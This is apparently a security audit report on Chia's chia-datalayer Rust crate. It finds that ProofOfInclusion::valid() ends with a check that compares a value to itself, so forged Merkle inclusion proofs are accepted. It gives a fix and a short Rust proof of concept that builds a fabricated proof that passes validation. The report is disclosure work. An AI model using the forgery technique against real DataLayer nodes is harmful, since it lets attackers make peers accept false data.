### Title
`ProofOfInclusion::valid()` Tautological Root-Hash Check Allows Forged DataLayer Inclusion Proofs — (File: `crates/chia-datalayer/src/merkle/proof_of_inclusion.rs`)

### Summary
`ProofOfInclusion::valid()` contains a final check that is a mathematical tautology: it compares `existing_hash` against `self.root_hash()`, but `root_hash()` returns the `combined_hash` of the last layer — the exact same value that `existing_hash` was just set to inside the loop. The check always passes whenever the internal chain is self-consistent. The function never verifies the proof against any external trusted root hash. Any caller that relies solely on `valid()` to authenticate a deserialized `ProofOfInclusion` can be deceived by a crafted proof claiming arbitrary inclusion in an attacker-chosen root.

### Finding Description

`ProofOfInclusion::valid()` is defined as:

```rust
pub fn valid(&self) -> bool {
    let mut existing_hash = self.node_hash;

    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );

        if calculated_hash != layer.combined_hash {
            return false;
        }

        existing_hash = calculated_hash;   // ← set to layer.combined_hash
    }

    existing_hash == self.root_hash()      // ← always true (see below)
}
```

`root_hash()` is:

```rust
pub fn root_hash(&self) -> Hash {
    if let Some(last) = self.layers.last() {
        last.combined_hash          // ← same field just assigned to existing_hash
    } else {
        self.node_hash
    }
}
```

After the loop completes without returning `false`, `existing_hash` equals `layers.last().combined_hash` (because the loop body enforces `calculated_hash == layer.combined_hash` and then sets `existing_hash = calculated_hash`). `self.root_hash()` also returns `layers.last().combined_hash`. The final comparison is therefore `X == X`, which is unconditionally `true`.

For the empty-layers case: `existing_hash` is initialized to `self.node_hash` and never modified; `root_hash()` returns `self.node_hash`; the check is again `X == X`.

**In both cases the final guard is a no-op.** The function only verifies that the hash chain is internally self-consistent; it never checks the computed root against any externally-trusted value.

An attacker can construct a `ProofOfInclusion` bottom-up:

1. Set `node_hash` to any target leaf hash (e.g. `H(fake_key || fake_value)`).
2. For each layer, freely choose `other_hash` and `other_hash_side`, then compute `combined_hash = calculate_internal_hash(prev, side, other_hash)`.
3. The final `combined_hash` becomes whatever the attacker's chosen chain produces — a fully attacker-controlled "root hash".

`valid()` returns `true` for this proof. `root_hash()` returns the attacker-chosen value. Any verifier that calls only `proof.valid()` without separately asserting `proof.root_hash() == known_trusted_root` accepts the forged proof.

`ProofOfInclusion` is a `Streamable` type with public `from_bytes()` / `from_bytes_unchecked()` constructors and is fully exposed through the Python bindings:

```python
class ProofOfInclusion:
    node_hash: bytes32
    layers: list[ProofOfInclusionLayer]
    def root_hash(self) -> bytes32: ...
    def valid(self) -> bool: ...
    @classmethod
    def from_bytes(cls, blob: bytes) -> Self: ...
```

DataLayer nodes exchange proofs over the network. A receiving node that deserializes a peer-supplied `ProofOfInclusion` and calls `proof.valid()` as its sole gate has no protection against this forgery.

### Impact Explanation

An attacker who can deliver a crafted serialized `ProofOfInclusion` to any code path that calls `proof.valid()` without also checking `proof.root_hash() == known_root` can:

- Claim that an arbitrary key-value pair is included in a DataLayer store whose root the verifier trusts.
- Claim that a key-value pair is included in a completely fabricated root, causing the verifier to accept a false tree state.

This directly matches the allowed High impact: **DataLayer Merkle proof/blob/delta logic accepts forged inclusion/exclusion, corrupts tree roots, or lets untrusted input prove invalid state.**

### Likelihood Explanation

The `ProofOfInclusion` struct is a first-class serializable type exposed to Python. DataLayer synchronization inherently involves receiving proofs from untrusted peers. The misleading name `valid()` strongly invites callers to treat a `true` return as a complete proof of inclusion, without realizing a separate root-hash comparison is required. The tautology is non-obvious and is not documented.

### Recommendation

Replace the tautological self-comparison with a check against a caller-supplied trusted root:

```rust
pub fn valid_against_root(&self, expected_root: &Hash) -> bool {
    let mut existing_hash = self.node_hash;
    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );
        if calculated_hash != layer.combined_hash {
            return false;
        }
        existing_hash = calculated_hash;
    }
    &existing_hash == expected_root   // compare against external trusted root
}
```

Alternatively, deprecate the current `valid()` and require callers to always pass the known root. Update the Python binding accordingly. Add a test that constructs a forged `ProofOfInclusion` from bytes and confirms it fails validation against the real root.

### Proof of Concept

```rust
use chia_datalayer::{Hash, MerkleBlob, KeyId, ValueId, InsertLocation};
use chia_datalayer::merkle::proof_of_inclusion::{ProofOfInclusion, ProofOfInclusionLayer};
use chia_datalayer::Side;

// Build a real tree and get its root
let mut blob = MerkleBlob::new(Vec::new()).unwrap();
blob.insert(KeyId(1), ValueId(1), &[0xAA; 32], InsertLocation::Auto {}).unwrap();
blob.calculate_lazy_hashes().unwrap();
let real_root = blob.get_root().unwrap();

// Forge a proof for a fake key claiming inclusion in an attacker-chosen root
let fake_node_hash: Hash = [0xBB; 32];
let fake_other_hash: Hash = [0xCC; 32];
// compute combined_hash = calculate_internal_hash(fake_node_hash, Left, fake_other_hash)
// (attacker computes this offline)
let fake_combined_hash: Hash = chia_datalayer::calculate_internal_hash(
    &fake_node_hash, Side::Left, &fake_other_hash
);

let forged = ProofOfInclusion {
    node_hash: fake_node_hash,
    layers: vec![ProofOfInclusionLayer {
        other_hash_side: Side::Left,
        other_hash: fake_other_hash,
        combined_hash: fake_combined_hash,  // attacker-controlled root
    }],
};

// valid() returns true despite the proof being entirely fabricated
assert!(forged.valid());
// root_hash() returns the attacker-chosen value, not the real tree root
assert_ne!(forged.root_hash(), real_root);
// A verifier that only calls valid() is deceived
